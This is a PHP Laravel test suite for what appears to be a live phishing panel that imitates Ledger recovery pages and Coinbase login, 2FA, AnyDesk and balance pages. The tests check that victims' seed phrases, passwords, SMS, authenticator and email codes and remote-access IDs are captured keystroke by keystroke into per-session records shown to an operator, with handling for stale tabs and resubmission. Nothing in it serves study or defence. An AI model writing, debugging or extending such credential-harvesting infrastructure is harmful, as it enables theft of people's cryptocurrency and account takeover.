<?php

namespace Tests\Feature;

use App\Models\UserEvent;
use App\Models\UserSession;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Str;
use Tests\TestCase;

class ActivityV2DocumentIdTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutMiddleware([
            ThrottleRequests::class,
        ]);
    }

    public function test_get_issues_document_id_and_sets_current_page(): void
    {
        $token = $this->token();
        $html = $this->withCookie('liveled_token', $token)
            ->get('/ledger/3')
            ->assertOk()
            ->getContent();

        $session = UserSession::where('session_token', $token)->first();
        $this->assertNotNull($session);
        $this->assertMatchesRegularExpression('/^[a-f0-9]{32}$/', (string) $session->document_id);
        $this->assertNotNull($session->document_issued_at);
        $this->assertGreaterThan(0, (int) $session->document_issued_at);
        $this->assertSame('ledger_3', $session->current_page);
        $this->assertStringContainsString("window._llDocId='{$session->document_id}'", $html);
    }

    public function test_preview_does_not_issue_document_id(): void
    {
        $this->withSession(['admin_auth' => true, 'admin_role' => 'master']);
        $before = UserSession::count();
        $html = $this->get('/ledger/3?_liveled_preview=1')->assertOk()->getContent();
        $this->assertSame($before, UserSession::count());
        $this->assertStringNotContainsString("window._llDocId='", $html);
    }

    public function test_page_visit_requires_matching_document_id(): void
    {
        [$token, $doc] = $this->openLedger();
        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => '',
        ])->assertStatus(409)->assertJson(['ok' => false]);

        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => 'ffffffffffffffffffffffffffffffff',
        ])->assertStatus(409);

        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'element' => 'page',
            'doc' => $doc,
        ])->assertOk()->assertJsonPath('ok', true)->assertJsonStructure(['stay']);
    }

    public function test_live_before_visit_is_409(): void
    {
        [$token, $doc] = $this->openLedger();
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['alpha'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => 1,
        ])->assertStatus(409);
        $this->assertSame(0, UserEvent::where('session_token', $token)->count());
    }

    public function test_stay_mismatch_is_409_and_same_stay_submit_retry_is_200(): void
    {
        [$token, $doc, $stay] = $this->openLedgerStay();

        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['one', 'two'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => $stay + 99,
        ])->assertStatus(409);

        $snap = json_encode(['words' => ['one', 'two'], 'passphrase' => '']);
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => $snap,
            'doc' => $doc,
            'stay' => $stay,
        ])->assertOk();

        $this->postEvent($token, [
            'type' => 'form_submit',
            'page' => 'ledger_3',
            'element' => 'seed_phrase',
            'value' => 'one two',
            'doc' => $doc,
            'stay' => $stay,
        ])->assertOk()->assertJson(['ok' => true]);

        $events = UserEvent::where('session_token', $token)->count();
        $this->postEvent($token, [
            'type' => 'form_submit',
            'page' => 'ledger_3',
            'element' => 'seed_phrase',
            'value' => 'one two',
            'doc' => $doc,
            'stay' => $stay,
        ])->assertOk()->assertJson(['ok' => true]);
        $this->assertSame($events, UserEvent::where('session_token', $token)->count());

        $row = $this->lastAttempt($token, 'ledger_3');
        $this->assertSame('sealed', $row['state']);
        $this->assertSame($stay, (int) $row['attempt_id']);
    }

    public function test_delayed_old_document_after_newer_get_is_rejected(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $old = UserSession::where('session_token', $token)->value('document_id');
        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'element' => 'page',
            'doc' => $old,
        ])->assertOk();
        $stayA = (int) $this->lastAttempt($token, 'ledger_3')['attempt_id'];

        $this->withCookie('liveled_token', $token)->get('/ledger/loading')->assertOk();
        $new = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($old, $new);
        $this->assertSame('ledger_loading', UserSession::where('session_token', $token)->value('current_page'));

        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'element' => 'page',
            'doc' => $old,
        ])->assertStatus(409);
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['late'], 'passphrase' => '']),
            'doc' => $old,
            'stay' => $stayA,
        ])->assertStatus(409);

        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_loading',
            'element' => 'page',
            'doc' => $new,
        ])->assertOk();

        $row = $this->lastAttempt($token, 'ledger_3');
        $this->assertSame('sealed', $row['state']);
        $this->assertSame($stayA, (int) $row['attempt_id']);
        $this->assertSame([], $row['words']);
    }

    public function test_f5_issues_new_document_and_reuses_attempt_id(): void
    {
        [$token, $doc, $stay] = $this->openLedgerStay();
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['keep'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => $stay,
        ])->assertOk();

        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $doc2 = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($doc, $doc2);

        $ack = $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'element' => 'page',
            'doc' => $doc2,
        ])->assertOk()->json();
        $this->assertSame($stay, (int) $ack['stay']);
        $this->assertCount(1, UserSession::where('session_token', $token)->first()->activity_summary['attempts']['ledger_3']);
        $this->assertSame(['keep'], $this->lastAttempt($token, 'ledger_3')['words']);
    }

    public function test_lost_ack_same_document_visit_retry_keeps_same_stay(): void
    {
        [$token, $doc, $stay] = $this->openLedgerStay();
        $ack = $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'element' => 'page',
            'doc' => $doc,
        ])->assertOk()->json();
        $this->assertSame($stay, (int) $ack['stay']);
        $this->assertCount(1, UserSession::where('session_token', $token)->first()->activity_summary['attempts']['ledger_3']);
    }

    public function test_second_tab_last_get_wins(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $first = UserSession::where('session_token', $token)->value('document_id');
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $second = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($first, $second);

        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $first,
        ])->assertStatus(409);
        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $second,
        ])->assertOk();
    }

    public function test_heartbeat_does_not_write_current_page(): void
    {
        [$token] = $this->openLedger();
        $this->withCookie('liveled_token', $token)
            ->post('/api/ping', ['page' => 'ledger_loading'])
            ->assertOk();
        $this->assertSame('ledger_3', UserSession::where('session_token', $token)->value('current_page'));
    }

    public function test_validation_is_422_and_missing_session_is_503(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)
            ->post('/api/log', [])
            ->assertStatus(422)
            ->assertJson(['ok' => false]);

        $this->withCookie('liveled_token', $token)
            ->post('/api/log', [
                'type' => 'page_visit',
                'page' => 'ledger_3',
                'doc' => str_repeat('ab', 16),
            ])
            ->assertStatus(503);
    }

    public function test_ordinary_event_without_doc_is_allowed_and_mismatched_doc_is_409(): void
    {
        [$token, $doc] = $this->openLedger();
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'word_count',
            'value' => '24',
        ])->assertOk();
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'word_count',
            'value' => '12',
            'doc' => 'ffffffffffffffffffffffffffffffff',
        ])->assertStatus(409);
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'word_count',
            'value' => '12',
            'doc' => $doc,
        ])->assertOk();
    }

    public function test_two_attempt_families_and_ordinary_box_do_not_cross_write(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $ledgerDoc = UserSession::where('session_token', $token)->value('document_id');
        $ledgerStay = $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $ledgerDoc,
        ])->assertOk()->json('stay');
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['ledgerword'], 'passphrase' => '']),
            'doc' => $ledgerDoc,
            'stay' => $ledgerStay,
        ])->assertOk();

        $this->withCookie('liveled_token', $token)->get('/coinbase/seed')->assertOk();
        $seedDoc = UserSession::where('session_token', $token)->value('document_id');
        $seedStay = $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'coinbase_seed',
            'doc' => $seedDoc,
        ])->assertOk()->json('stay');
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'coinbase_seed',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['seedword'], 'passphrase' => '']),
            'doc' => $seedDoc,
            'stay' => $seedStay,
        ])->assertOk();

        $this->postEvent($token, [
            'type' => 'form_input',
            'page' => 'coinbase_password',
            'element' => 'password_partial',
            'value' => 'pw',
            'doc' => $seedDoc,
        ])->assertOk();

        $summary = UserSession::where('session_token', $token)->first()->activity_summary;
        $this->assertSame('sealed', $summary['attempts']['ledger_3'][0]['state']);
        $this->assertSame(['ledgerword'], $summary['attempts']['ledger_3'][0]['words']);
        $this->assertSame('active', $summary['attempts']['coinbase_seed'][0]['state']);
        $this->assertSame(['seedword'], $summary['attempts']['coinbase_seed'][0]['words']);
    }

    public function test_overlapping_full_page_get_navigation_and_f5_order(): void
    {
        $token = $this->token();
        $docs = [];
        foreach (['/ledger/3', '/ledger/loading', '/ledger/3', '/ledger/2', '/ledger/3'] as $path) {
            $this->withCookie('liveled_token', $token)->get($path)->assertOk();
            $docs[] = UserSession::where('session_token', $token)->value('document_id');
        }
        $this->assertCount(5, array_unique($docs));
        $current = end($docs);

        foreach (array_slice($docs, 0, -1) as $stale) {
            $this->postEvent($token, [
                'type' => 'page_visit',
                'page' => 'ledger_3',
                'doc' => $stale,
            ])->assertStatus(409);
        }

        $ack = $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $current,
        ])->assertOk()->json();
        $this->assertIsInt($ack['stay']);
        $this->assertSame($current, UserSession::where('session_token', $token)->value('document_id'));
        $this->assertSame('ledger_3', UserSession::where('session_token', $token)->value('current_page'));
    }

    public function test_rapid_sequential_get_and_event_storm_has_zero_lifecycle_corruption(): void
    {
        $ops = 0;
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $ops++;
        $doc = UserSession::where('session_token', $token)->value('document_id');
        $stay = $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc,
        ])->assertOk()->json('stay');
        $ops++;

        for ($i = 0; $i < 80; $i++) {
            $this->postEvent($token, [
                'type' => 'phrase_input',
                'page' => 'ledger_3',
                'element' => 'full_state',
                'value' => json_encode(['words' => ['w'.$i], 'passphrase' => '']),
                'doc' => $doc,
                'stay' => $stay,
            ])->assertOk();
            $ops++;
        }

        for ($i = 0; $i < 40; $i++) {
            $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
            $ops++;
            $doc = UserSession::where('session_token', $token)->value('document_id');
            $ack = $this->postEvent($token, [
                'type' => 'page_visit',
                'page' => 'ledger_3',
                'doc' => $doc,
            ])->assertOk()->json();
            $ops++;
            $this->assertSame($stay, (int) $ack['stay']);
        }

        $this->postEvent($token, [
            'type' => 'form_submit',
            'page' => 'ledger_3',
            'element' => 'seed_phrase',
            'value' => 'final word',
            'doc' => $doc,
            'stay' => $stay,
        ])->assertOk();
        $ops++;

        $list = UserSession::where('session_token', $token)->first()->activity_summary['attempts']['ledger_3'];
        $this->assertCount(1, $list);
        $this->assertSame('sealed', $list[0]['state']);
        $this->assertSame($stay, (int) $list[0]['attempt_id']);
        $this->assertGreaterThanOrEqual(160, $ops);
    }

    public function test_older_html_start_cannot_overwrite_newer_authority(): void
    {
        $token = $this->token();
        $t2 = microtime(true);
        $t1 = $t2 - 0.75;

        $htmlB = $this->getTracked($token, '/ledger/3', $t2)->assertOk()->getContent();
        $session = UserSession::where('session_token', $token)->first();
        $docB = (string) $session->document_id;
        $issuedB = (int) $session->document_issued_at;
        $pageB = $session->current_page;
        $this->assertStringContainsString("window._llDocId='{$docB}'", $htmlB);

        $htmlA = $this->getTracked($token, '/ledger/loading', $t1)->assertOk()->getContent();
        $session->refresh();
        $this->assertSame($docB, (string) $session->document_id);
        $this->assertSame($issuedB, (int) $session->document_issued_at);
        $this->assertSame($pageB, $session->current_page);
        $this->assertDoesNotMatchRegularExpression("/window\\._llDocId='[a-f0-9]{32}'/", $htmlA);

        $this->getTracked($token, '/ledger/2', $t1)->assertOk();
        $session->refresh();
        $this->assertSame($docB, (string) $session->document_id);
        $this->assertSame($issuedB, (int) $session->document_issued_at);
        $this->assertSame($pageB, $session->current_page);

        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'element' => 'page',
            'doc' => $docB,
        ])->assertOk();
        $stay = (int) $this->lastAttempt($token, 'ledger_3')['attempt_id'];
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['visible'], 'passphrase' => '']),
            'doc' => $docB,
            'stay' => $stay,
        ])->assertOk();

        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_2',
            'doc' => '',
        ])->assertStatus(409);
        $this->getTracked($token, '/ledger/2', $t1)->assertOk();
        $this->assertSame($docB, (string) UserSession::where('session_token', $token)->value('document_id'));
        $this->assertSame('ledger_3', UserSession::where('session_token', $token)->value('current_page'));
        $this->assertSame(['visible'], $this->lastAttempt($token, 'ledger_3')['words']);
    }

    public function test_equal_request_start_issues_new_document(): void
    {
        $token = $this->token();
        $t = microtime(true);
        $this->getTracked($token, '/ledger/3', $t)->assertOk();
        $first = UserSession::where('session_token', $token)->value('document_id');
        $this->getTracked($token, '/ledger/3', $t)->assertOk();
        $second = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($first, $second);
        $this->assertSame((int) round($t * 1_000_000), (int) UserSession::where('session_token', $token)->value('document_issued_at'));
    }

    public function test_stale_singleton_families_rejected_current_updates_latest_known(): void
    {
        foreach ($this->singletonFamilies() as $case) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
            $old = UserSession::where('session_token', $token)->value('document_id');
            $this->postEvent($token, [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['first'],
                'doc' => $old,
            ])->assertOk();
            $this->assertSame($case['first_box'], $this->boxValue($token, $case['box']));

            $this->withCookie('liveled_token', $token)->get('/ledger/loading')->assertOk();
            $current = UserSession::where('session_token', $token)->value('document_id');
            $this->assertNotSame($old, $current);

            $events = UserEvent::where('session_token', $token)->count();
            $this->postEvent($token, [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['stale'],
            ])->assertStatus(409);
            $this->postEvent($token, [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['stale'],
                'doc' => $old,
            ])->assertStatus(409);
            $this->assertSame($events, UserEvent::where('session_token', $token)->count());
            $this->assertSame($case['first_box'], $this->boxValue($token, $case['box']));

            $this->postEvent($token, [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['next'],
                'doc' => $current,
            ])->assertOk();
            $this->assertSame($case['next_box'], $this->boxValue($token, $case['box']));
        }
    }

    private function token(): string
    {
        return Str::random(48);
    }

    private function getTracked(string $token, string $path, float $startedAt)
    {
        $this->withCookie('liveled_token', $token);

        return $this->call(
            'GET',
            $path,
            [],
            $this->prepareCookiesForRequest(),
            [],
            ['REQUEST_TIME_FLOAT' => $startedAt]
        );
    }

    private function boxValue(string $token, string $box): mixed
    {
        $summary = UserSession::where('session_token', $token)->first()->activity_summary;
        return $summary['boxes'][$box]['value'] ?? null;
    }

    private function singletonFamilies(): array
    {
        return [
            [
                'family' => 'coinbase_live',
                'page' => 'coinbase_password',
                'type' => 'form_input',
                'element' => 'password_partial',
                'first' => 'oldpw',
                'stale' => 'stale-pw',
                'next' => 'newpw',
                'box' => 'password',
                'first_box' => 'oldpw',
                'next_box' => 'newpw',
            ],
            [
                'family' => 'coinbase_live',
                'page' => 'coinbase_sms_code',
                'type' => 'code_input',
                'element' => 'code_partial',
                'first' => '111111',
                'stale' => '000000',
                'next' => '222222',
                'box' => 'sms',
                'first_box' => '111111',
                'next_box' => '222222',
            ],
            [
                'family' => 'coinbase_live',
                'page' => 'coinbase_authenticator_code',
                'type' => 'code_input',
                'element' => 'code_partial',
                'first' => '333333',
                'stale' => '000000',
                'next' => '444444',
                'box' => 'auth',
                'first_box' => '333333',
                'next_box' => '444444',
            ],
            [
                'family' => 'coinbase_live',
                'page' => 'coinbase_anydesk',
                'type' => 'code_input',
                'element' => 'anydesk_id',
                'first' => '111 222 333',
                'stale' => '000 000 000',
                'next' => '999 888 777',
                'box' => 'anydesk',
                'first_box' => '111 222 333',
                'next_box' => '999 888 777',
            ],
            [
                'family' => 'coinbase_live',
                'page' => 'coinbase_select_vault_assets',
                'type' => 'coin_input',
                'element' => 'selection',
                'first' => 'Bitcoin (btc)',
                'stale' => 'Stale (xxx)',
                'next' => 'Ether (eth)',
                'box' => 'vault',
                'first_box' => 'Bitcoin (btc)',
                'next_box' => 'Ether (eth)',
            ],
            [
                'family' => 'coinbase_submit',
                'page' => 'coinbase_sign_in',
                'type' => 'form_submit',
                'element' => 'email',
                'first' => 'old@example.com',
                'stale' => 'stale@example.com',
                'next' => 'new@example.com',
                'box' => 'email',
                'first_box' => 'old@example.com',
                'next_box' => 'new@example.com',
            ],
            [
                'family' => 'coinbase_submit',
                'page' => 'coinbase_email_code',
                'type' => 'form_submit',
                'element' => 'email_code',
                'first' => '111111',
                'stale' => '000000',
                'next' => '999999',
                'box' => 'mail2fa',
                'first_box' => '111111',
                'next_box' => '999999',
            ],
            [
                'family' => 'coinbase_submit',
                'page' => 'coinbase_reset_password',
                'type' => 'form_submit',
                'element' => 'reset_password',
                'first' => 'old: a | new: b',
                'stale' => 'old: x | new: y',
                'next' => 'old: c | new: d',
                'box' => 'reset',
                'first_box' => 'old: a | new: b',
                'next_box' => 'old: c | new: d',
            ],
            [
                'family' => 'coinbase_submit',
                'page' => 'coinbase_last_activity',
                'type' => 'form_submit',
                'element' => 'last_activity',
                'first' => 'Within a day',
                'stale' => 'Within a week',
                'next' => 'Within a month',
                'box' => 'active',
                'first_box' => 'Within a day',
                'next_box' => 'Within a month',
            ],
            [
                'family' => 'coinbase_submit',
                'page' => 'coinbase_estimated_balance',
                'type' => 'form_submit',
                'element' => 'estimated_balance',
                'first' => 'Under $ 1,000',
                'stale' => '$10,000 - $99,999',
                'next' => '$1,000 - $9,999',
                'box' => 'balance',
                'first_box' => 'Under $ 1,000',
                'next_box' => '$1,000 - $9,999',
            ],
            [
                'family' => 'coinbase_submit',
                'page' => 'coinbase_device_confirmation',
                'type' => 'form_submit',
                'element' => 'confirmation_link',
                'first' => 'https://old.example/link',
                'stale' => 'https://stale.example/link',
                'next' => 'https://new.example/link',
                'box' => 'link',
                'first_box' => 'https://old.example/link',
                'next_box' => 'https://new.example/link',
            ],
        ];
    }

    private function openLedger(): array
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $doc = UserSession::where('session_token', $token)->value('document_id');
        return [$token, $doc];
    }

    private function openLedgerStay(): array
    {
        [$token, $doc] = $this->openLedger();
        $stay = $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'element' => 'page',
            'doc' => $doc,
        ])->assertOk()->json('stay');
        return [$token, $doc, (int) $stay];
    }

    private function postEvent(string $token, array $payload)
    {
        return $this->withCookie('liveled_token', $token)->post('/api/log', $payload);
    }

    private function lastAttempt(string $token, string $page): array
    {
        $summary = UserSession::where('session_token', $token)->first()->activity_summary;
        $list = $summary['attempts'][$page];
        return $list[count($list) - 1];
    }
}
